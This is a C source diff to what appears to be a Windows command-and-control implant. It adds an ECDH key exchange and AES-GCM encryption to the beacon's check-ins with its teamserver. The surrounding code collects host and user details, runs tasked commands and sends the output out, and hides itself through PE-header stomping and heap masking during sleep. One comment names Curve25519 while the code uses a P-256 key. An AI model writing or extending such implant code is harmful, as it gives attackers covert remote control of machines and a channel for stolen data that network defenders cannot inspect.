@@ -90,6 +90,18 @@ static int  g_c2_https     = 0;
  * Used by stomp_pe_header() so it stomps the correct image base. */
 static HMODULE g_own_module = NULL;
 
+/* ── ECDH / session key globals ──────────────────────────────
+ * g_session_key  holds the 32-byte AES-256 key derived from the
+ *                Curve25519 ECDH exchange with the teamserver.
+ * g_session_ready is set to 1 once the key is valid.
+ * g_ecdh_kp      holds the ephemeral CNG key pair (freed after handshake).
+ * g_ecdh_pub     is the 32-byte raw public key we send to the server.
+ */
+static UCHAR       g_session_key[32] = {0};
+static int         g_session_ready   = 0;
+static ecdh_keypair g_ecdh_kp        = {0};
+static UCHAR       g_ecdh_pub[ECDH_PUB_LEN] = {0}; /* 65-byte uncompressed P-256 point */
+
 /* ── Helpers ─────────────────────────────────────────────── */
 
 static void get_hostname(char *buf, size_t len) {
@@ -254,6 +266,7 @@ static int exec_cmd(const char *cmd, char *out_b64, size_t out_b64_len) {
 
 static int http_post(const char *host, int port, int use_https, const char *path,
                      const char *body, size_t body_len, const char *agent_id,
+                     int encrypted,   /* 1 = body is encrypted, add X-Encrypted header */
                      char *resp, size_t resp_len)
 {
     resp[0] = '\0';
@@ -268,12 +281,19 @@ static int http_post(const char *host, int port, int use_https, const char *path
                                         WINHTTP_DEFAULT_ACCEPT_TYPES, flags);
     if (!hReq) { WinHttpCloseHandle(hConn); WinHttpCloseHandle(hSession); return -1; }
 
-    char hdr_narrow[512];
-    if (agent_id && agent_id[0])
-        snprintf(hdr_narrow, sizeof(hdr_narrow), "Content-Type: application/json\r\nX-Agent-ID: %s\r\n", agent_id);
-    else
+    char hdr_narrow[640];
+    if (agent_id && agent_id[0]) {
+        if (encrypted)
+            snprintf(hdr_narrow, sizeof(hdr_narrow),
+                     "Content-Type: application/octet-stream\r\nX-Agent-ID: %s\r\nX-Encrypted: 1\r\n",
+                     agent_id);
+        else
+            snprintf(hdr_narrow, sizeof(hdr_narrow),
+                     "Content-Type: application/json\r\nX-Agent-ID: %s\r\n", agent_id);
+    } else {
         snprintf(hdr_narrow, sizeof(hdr_narrow), "Content-Type: application/json\r\n");
-    WCHAR hdr_wide[512]; ascii_to_wide(hdr_narrow, hdr_wide, 512);
+    }
+    WCHAR hdr_wide[640]; ascii_to_wide(hdr_narrow, hdr_wide, 640);
 
     if (!WinHttpSendRequest(hReq, hdr_wide, (DWORD)-1L, (LPVOID)body, (DWORD)body_len, (DWORD)body_len, 0)) {
         WinHttpCloseHandle(hReq); WinHttpCloseHandle(hConn); WinHttpCloseHandle(hSession); return -1;
@@ -290,6 +310,72 @@ static int http_post(const char *host, int port, int use_https, const char *path
     resp[total] = '\0';
     WinHttpCloseHandle(hReq); WinHttpCloseHandle(hConn); WinHttpCloseHandle(hSession);
     return (status >= 200 && status < 300) ? 0 : -1;
+}
+
+/*
+ * http_post_encrypted:
+ *   Convenience wrapper that GCM-encrypts plain_json, base64-encodes it,
+ *   sends it, then base64-decodes and GCM-decrypts the server's response
+ *   back into plain_resp (NUL-terminated JSON).
+ *
+ *   Returns 0 on success, -1 on any error.
+ */
+static int http_post_encrypted(const char *host, int port, int use_https,
+                                const char *path,
+                                const char *plain_json, size_t plain_len,
+                                const char *agent_id,
+                                char *plain_resp, size_t plain_resp_len)
+{
+    /* ── Encrypt ──────────────────────────────────────────────── */
+    size_t enc_buf_size = plain_len + GCM_OVERHEAD + 4;
+    UCHAR *enc_buf = (UCHAR *)malloc(enc_buf_size);
+    if (!enc_buf) return -1;
+
+    int enc_len = gcm_encrypt(g_session_key,
+                              (const UCHAR *)plain_json, (ULONG)plain_len,
+                              enc_buf, (ULONG)enc_buf_size);
+    if (enc_len < 0) { free(enc_buf); return -1; }
+
+    /* Base64-encode the encrypted blob */
+    size_t b64_size = ((enc_len + 2) / 3) * 4 + 4;
+    char *b64_body = (char *)malloc(b64_size);
+    if (!b64_body) { free(enc_buf); return -1; }
+    b64_encode(enc_buf, (size_t)enc_len, b64_body);
+    free(enc_buf);
+
+    /* ── Send ─────────────────────────────────────────────────── */
+    char raw_resp[BUF_SIZE * 4];
+    int ret = http_post(host, port, use_https, path,
+                        b64_body, strlen(b64_body), agent_id, 1,
+                        raw_resp, sizeof(raw_resp));
+    free(b64_body);
+    if (ret != 0) return -1;
+
+    /* ── Decrypt response ─────────────────────────────────────── */
+    if (!raw_resp[0]) {
+        /* Empty body — treat as "{}": no tasks */
+        strncpy(plain_resp, "{}", plain_resp_len - 1);
+        plain_resp[plain_resp_len - 1] = '\0';
+        return 0;
+    }
+
+    size_t resp_b64_len = strlen(raw_resp);
+    size_t dec_buf_size = resp_b64_len + 4;
+    UCHAR *dec_buf = (UCHAR *)malloc(dec_buf_size);
+    if (!dec_buf) return -1;
+    int dec_enc_len = b64_decode(raw_resp, dec_buf, dec_buf_size);
+    if (dec_enc_len < (int)GCM_OVERHEAD) { free(dec_buf); return -1; }
+
+    size_t plain_out_size = (size_t)dec_enc_len; /* plaintext <= ciphertext blob */
+    if (plain_out_size > plain_resp_len - 1) plain_out_size = plain_resp_len - 1;
+    int plain_len_out = gcm_decrypt(g_session_key,
+                                    dec_buf, (ULONG)dec_enc_len,
+                                    (UCHAR *)plain_resp, (ULONG)plain_out_size);
+    free(dec_buf);
+    if (plain_len_out < 0) return -1;
+
+    plain_resp[plain_len_out] = '\0';
+    return 0;
 }
 
 /* ── Built-in command handlers ───────────────────────────── */
@@ -581,10 +667,16 @@ static DWORD WINAPI run_beacon(LPVOID unused) {
     g_c2_port  = C2_PORT;
     g_c2_https = USE_HTTPS;
 
-    /* Register all sensitive globals for heap XOR during sleep */
-    heap_register_region(g_agent_id, sizeof(g_agent_id));
-    heap_register_region(g_c2_host,  sizeof(g_c2_host));
-    heap_register_region(&g_c2_port, sizeof(g_c2_port));
+    /* Register all sensitive globals for heap XOR during sleep.
+       Session key is registered after it is derived from ECDH. */
+    heap_register_region(g_agent_id,    sizeof(g_agent_id));
+    heap_register_region(g_c2_host,     sizeof(g_c2_host));
+    heap_register_region(&g_c2_port,    sizeof(g_c2_port));
+
+    /* ── Generate ephemeral ECDH-P256 key pair ── */
+    if (ecdh_gen_keypair(&g_ecdh_kp, g_ecdh_pub) != 0) {
+        memset(g_ecdh_pub, 0, sizeof(g_ecdh_pub));
+    }
 
     const char *path = "/";
 
@@ -616,29 +708,78 @@ static DWORD WINAPI run_beacon(LPVOID unused) {
 
     for (;;) {
         if (!g_agent_id[0]) {
+            /* ── First check-in: register and perform ECDH handshake ── */
             char he[128], ue[128], ie[128], pe[512];
             json_escape(hostname, he, sizeof(he));
             json_escape(username, ue, sizeof(ue));
             json_escape(internal_ip, ie, sizeof(ie));
             json_escape(process_name, pe, sizeof(pe));
+
+            /* Base64-encode our 65-byte uncompressed P-256 public key */
+            char pub_b64[100]; /* ceil(65/3)*4 + 1 = 92 + 1 */
+            b64_encode(g_ecdh_pub, ECDH_PUB_LEN, pub_b64);
+
             snprintf(body, sizeof(body),
                 "{\"sysinfo\":{\"hostname\":%s,\"username\":%s,\"os\":\"Windows\",\"arch\":\"amd64\","
-                "\"pid\":%d,\"process_name\":%s,\"internal_ip\":%s,\"sleep\":%d,\"jitter\":%d}}",
-                he, ue, get_pid(), pe, ie, g_sleep_ms / 1000, g_jitter_pct);
-        } else {
-            snprintf(body, sizeof(body), "{}");
-        }
+                "\"pid\":%d,\"process_name\":%s,\"internal_ip\":%s,\"sleep\":%d,\"jitter\":%d},"
+                "\"pubkey\":\"%s\"}",
+                he, ue, get_pid(), pe, ie, g_sleep_ms / 1000, g_jitter_pct, pub_b64);
 
-        if (http_post(g_c2_host, g_c2_port, g_c2_https, path, body, strlen(body),
-                      g_agent_id[0] ? g_agent_id : NULL, resp, sizeof(resp)) != 0)
-            goto do_sleep;
+            if (http_post(g_c2_host, g_c2_port, g_c2_https, path,
+                          body, strlen(body), NULL, 0,
+                          resp, sizeof(resp)) != 0)
+                goto do_sleep;
 
-        if (!g_agent_id[0]) {
+            /* Extract agent_id */
             json_get_string(resp, "\"agent_id\"", g_agent_id, sizeof(g_agent_id));
+
+            /* ── Complete ECDH to derive session key ── */
+            {
+                char srv_pub_b64[100], kex_nonce_b64[52];
+                srv_pub_b64[0] = kex_nonce_b64[0] = '\0';
+                json_get_string(resp, "\"server_pubkey\"",  srv_pub_b64,   sizeof(srv_pub_b64));
+                json_get_string(resp, "\"kex_nonce\"",     kex_nonce_b64, sizeof(kex_nonce_b64));
+
+                if (srv_pub_b64[0] && kex_nonce_b64[0] && g_ecdh_kp.hKey) {
+                    UCHAR srv_pub[ECDH_PUB_LEN], kex_nonce[32], shared[32];
+                    memset(srv_pub, 0, ECDH_PUB_LEN); memset(kex_nonce, 0, 32);
+
+                    b64_decode(srv_pub_b64,   srv_pub,   ECDH_PUB_LEN);
+                    b64_decode(kex_nonce_b64, kex_nonce, 32);
+
+                    if (ecdh_compute_shared(&g_ecdh_kp, srv_pub, shared) == 0) {
+                        hkdf_sha256(shared, 32, kex_nonce, 32, "apex-c2-v1",
+                                    g_session_key, 32);
+                        g_session_ready = 1;
+                        /* Register session key for sleep XOR protection */
+                        heap_register_region(g_session_key, sizeof(g_session_key));
+                    }
+                    SecureZeroMemory(shared, 32);
+                }
+            }
+            /* Destroy ephemeral private key — no longer needed */
+            ecdh_free(&g_ecdh_kp);
+            SecureZeroMemory(g_ecdh_pub, 32);
+
             goto do_sleep;
         }
 
-        /* Parse all pending tasks from response */
+        /* ── Regular beacon: send encrypted body, get encrypted tasks ── */
+        if (g_session_ready) {
+            if (http_post_encrypted(g_c2_host, g_c2_port, g_c2_https, path,
+                                    "{}", 2,
+                                    g_agent_id,
+                                    resp, sizeof(resp)) != 0)
+                goto do_sleep;
+        } else {
+            if (http_post(g_c2_host, g_c2_port, g_c2_https, path,
+                          "{}", 2,
+                          g_agent_id, 0,
+                          resp, sizeof(resp)) != 0)
+                goto do_sleep;
+        }
+
+        /* Parse all pending tasks from (already-decrypted) response */
         parsed_task tasks[MAX_TASKS_PER_BEACON];
         int task_count = parse_tasks(resp, tasks, MAX_TASKS_PER_BEACON);
         if (task_count == 0) goto do_sleep;
@@ -737,7 +878,17 @@ static DWORD WINAPI run_beacon(LPVOID unused) {
         }
 
         roff += (size_t)snprintf(results + roff, results_cap - roff, "]}");
-        http_post(g_c2_host, g_c2_port, g_c2_https, path, results, roff, g_agent_id, resp, sizeof(resp));
+
+        /* Send task results — encrypted if session is ready */
+        if (g_session_ready) {
+            http_post_encrypted(g_c2_host, g_c2_port, g_c2_https, path,
+                                results, roff, g_agent_id,
+                                resp, sizeof(resp));
+        } else {
+            http_post(g_c2_host, g_c2_port, g_c2_https, path,
+                      results, roff, g_agent_id, 0,
+                      resp, sizeof(resp));
+        }
         free(results);
 
         if (should_exit) ExitProcess(0);
